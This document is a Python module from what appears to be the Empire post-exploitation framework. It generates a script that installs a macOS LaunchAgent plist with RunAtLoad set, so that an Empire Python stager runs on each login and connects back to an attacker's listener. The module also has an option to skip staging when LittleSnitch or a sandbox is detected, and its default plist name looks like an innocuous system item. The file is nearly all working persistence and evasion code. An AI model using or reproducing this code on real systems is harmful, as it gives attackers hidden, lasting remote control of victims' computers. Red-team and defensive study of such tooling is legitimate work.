import base64
class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'LaunchAgent - UserLand Persistence',

            # list of one or more authors for the module
            'Author': ['@xorrior','@n0pe_sled'],

            # more verbose multi-line description of the module
            'Description': ('Installs an Empire launchAgent.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'PLISTName' : {
                'Description'   :   'Name of the PLIST to install. Name will also be used for the plist file.',
                'Required'      :   True,
                'Value'         :   'com.proxy.initialize.plist'
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        PLISTName = self.options['PLISTName']['Value']
        programname = "~/Library/LaunchAgents"
        plistfilename = "%s.plist" % PLISTName
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
        launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")


        plistSettings = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>%s</string>
<key>ProgramArguments</key>
<array>
<string>python</string>
<string>-c</string>
<string>%s</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
""" % (PLISTName, launcher)

        script = """
import subprocess
import sys
import base64
import os


plistPath = "/Library/LaunchAgents/%s"

if not os.path.exists(os.path.split(plistPath)[0]):
    os.makedirs(os.path.split(plistPath)[0])

plist = \"\"\"
%s
\"\"\"

homedir = os.getenv("HOME")

plistPath = homedir + plistPath

e = open(plistPath,'wb')
e.write(plist)
e.close()

os.chmod(plistPath, 0644)


print "\\n[+] Persistence has been installed: /Library/LaunchAgents/%s"

""" % (PLISTName,plistSettings,PLISTName)

        return script